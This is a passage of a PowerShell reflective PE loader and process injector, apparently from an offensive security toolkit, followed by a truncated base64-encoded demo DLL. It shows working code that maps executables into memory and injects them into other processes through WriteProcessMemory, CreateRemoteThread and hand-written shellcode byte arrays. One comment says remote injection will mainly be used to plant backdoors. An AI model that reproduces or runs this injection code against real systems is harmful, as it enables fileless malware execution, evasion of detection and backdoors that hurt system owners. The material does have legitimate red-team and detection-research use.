                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }

        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null


        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"


        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types


        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types


        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }


        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem

                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }


    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }

                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants

        $RemoteProcHandle = [IntPtr]::Zero

        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | Where-Object { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }

        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }

        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "PrintMsgBox"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "PrintMsgBox"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $Null = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }

        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
	$MsgBox64Dll = "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